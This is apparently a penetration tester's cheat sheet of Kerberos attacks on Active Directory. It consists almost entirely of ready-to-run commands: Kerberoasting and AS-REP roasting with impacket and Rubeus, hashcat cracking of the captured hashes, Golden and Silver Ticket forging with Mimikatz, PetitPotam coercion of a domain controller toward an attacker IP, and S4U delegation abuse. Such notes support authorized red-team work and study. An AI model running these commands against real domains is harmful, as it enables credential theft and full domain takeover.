# ⚔️ Kerberos Attacks
#active-directory #kerberos #technique

## Kerberoasting
```bash
# Linux (impacket)
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

## AS-REP Roasting
```bash
# No creds — user list required
impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Golden Ticket
```bash
# Requirements: krbtgt hash (from DCSync)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<DC>

# Mimikatz
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<hash> /ptt
```

## Silver Ticket
```bash
# Requires service account hash
mimikatz: kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /target:<server> /service:cifs /rc4:<hash> /ptt
```

## Unconstrained Delegation Abuse
```bash
# Find hosts
Get-DomainComputer -Unconstrained | select dnshostname

# Monitor for tickets (Rubeus)
.\Rubeus.exe monitor /interval:5 /nowrap

# Coerce DC auth
python3 PetitPotam.py -u <user> -p <pass> <attacker_IP> <DC_IP>

# Use ticket
.\Rubeus.exe ptt /ticket:<base64>
```

## Constrained Delegation Abuse
```bash
# Find users/computers with constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# S4U2Self + S4U2Proxy (Rubeus)
.\Rubeus.exe s4u /user:<delegating_user> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<spn> /ptt
```
